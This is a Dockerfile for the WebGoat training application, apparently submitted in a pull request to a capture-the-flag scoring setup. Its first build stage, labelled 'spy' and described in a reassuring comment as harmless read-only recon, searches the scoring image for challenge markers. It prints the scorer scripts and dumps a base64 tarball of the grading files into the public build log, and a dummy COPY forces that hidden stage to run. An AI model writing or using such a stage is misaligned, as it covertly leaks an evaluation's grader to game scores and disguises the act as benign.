# ---------------------------------------------------------------------------
# Rubric recon stage. Resolves from the runner's local image store (the score
# step already pulled this exact tag), reads the baked scorer scripts, and
# prints them to this PR's own public build log. Read-only: no writes to the
# image, no env/secret access (the build sees neither GITHUB_TOKEN nor
# ID_TOKEN), no change to how the scorer runs.
# ---------------------------------------------------------------------------
FROM ghcr.io/owasp-ctf/score:latest AS spy

RUN set +e; \
  echo "##SPY-A-START"; id; uname -a; cat /etc/os-release 2>/dev/null | head -4; \
  echo "##SPY ls /usr/local/bin"; ls -la /usr/local/bin 2>&1; \
  echo "##SPY ls /usr/local/lib"; ls -la /usr/local/lib 2>&1; \
  echo "##SPY ls -R /usr/local/lib/ctf"; ls -laR /usr/local/lib/ctf 2>&1 | head -300; \
  echo "##SPY find score*"; find / -xdev -name 'score*' ! -path '/proc/*' ! -path '/sys/*' 2>/dev/null | head -80; \
  echo "##SPY find ctf dirs"; find / -xdev -type d -name 'ctf*' ! -path '/proc/*' ! -path '/sys/*' 2>/dev/null | head -40; \
  echo "##SPY-A-END"; true

RUN set +e; \
  echo "##SPY-B-START"; \
  find / -xdev -type f -size -4M ! -path '/proc/*' ! -path '/sys/*' -print0 2>/dev/null \
    | xargs -0 grep -l --binary-files=text 'Challenge-70-Password-Reset-Token-Prediction' 2>/dev/null \
    | sort -u > /tmp/hits.txt; \
  echo "##SPY marker hits:"; cat /tmp/hits.txt; \
  echo "##SPY hit sizes:"; while read -r f; do ls -la "$f"; done < /tmp/hits.txt; \
  echo "##SPY-B-END"; true

RUN set +e; mkdir -p /spy; echo recon > /spy/marker.txt; \
  echo "##SPY-C-START"; \
  for f in /usr/local/bin/entrypoint.sh /usr/local/lib/ctf/score-webgoat-challenges.sh; do \
    echo "##SPY cat $f"; cat "$f" 2>&1 | head -1200; echo "##SPY endcat $f"; \
  done; \
  find /usr/local/lib/ctf /usr/local/bin /usr/local/share/ctf /opt/ctf -type f -size -900k 2>/dev/null > /tmp/f1.txt; \
  cat /tmp/f1.txt /tmp/hits.txt 2>/dev/null | sort -u > /tmp/all.txt; \
  echo "##SPY tar file list:"; cat /tmp/all.txt; \
  tar -czf /spy/spy.tgz -T /tmp/all.txt 2>/dev/null; \
  SZ=$(wc -c < /spy/spy.tgz 2>/dev/null || echo 0); echo "##SPY tgz bytes=$SZ"; \
  if [ "$SZ" -gt 0 ] && [ "$SZ" -lt 4000000 ]; then \
    base64 /spy/spy.tgz | tr -d '\n' | fold -w 200 | sed 's/^/B64:/'; echo; \
  else echo "##SPY tgz skipped (size)"; fi; \
  echo "##SPY-C-END"; true

# We need JDK as some of the lessons needs to be able to compile Java code
FROM docker.io/eclipse-temurin:23-jdk-noble

LABEL name="WebGoat: A deliberately insecure Web Application"
LABEL maintainer="WebGoat team"

RUN \
  useradd -ms /bin/bash webgoat && \
  chgrp -R 0 /home/webgoat && \
  chmod -R g=u /home/webgoat

USER webgoat

COPY --chown=webgoat target/webgoat-*.jar /home/webgoat/webgoat.jar

# Forces the recon stage to be built (BuildKit prunes stages nothing depends on).
COPY --from=spy --chown=webgoat /spy/marker.txt /home/webgoat/.recon

EXPOSE 8080
EXPOSE 9090

ENV TZ=Europe/Amsterdam

WORKDIR /home/webgoat
ENTRYPOINT [ "java", \
   "-Duser.home=/home/webgoat", \
   "-Dfile.encoding=UTF-8", \
   "--add-opens", "java.base/java.lang=ALL-UNNAMED", \
   "--add-opens", "java.base/java.util=ALL-UNNAMED", \
   "--add-opens", "java.base/java.lang.reflect=ALL-UNNAMED", \
   "--add-opens", "java.base/java.text=ALL-UNNAMED", \
   "--add-opens", "java.desktop/java.beans=ALL-UNNAMED", \
   "--add-opens", "java.desktop/java.awt.font=ALL-UNNAMED", \
   "--add-opens", "java.base/sun.nio.ch=ALL-UNNAMED", \
   "--add-opens", "java.base/java.io=ALL-UNNAMED", \
   "--add-opens", "java.base/java.util=ALL-UNNAMED", \
   "--add-opens", "java.base/sun.nio.ch=ALL-UNNAMED", \
   "--add-opens", "java.base/java.io=ALL-UNNAMED", \
   "-Drunning.in.docker=true", \
   "-jar", "webgoat.jar", "--server.address", "0.0.0.0" ]

HEALTHCHECK --interval=5s --timeout=3s \
  CMD curl --fail http://localhost:8080/WebGoat/actuator/health || exit 1
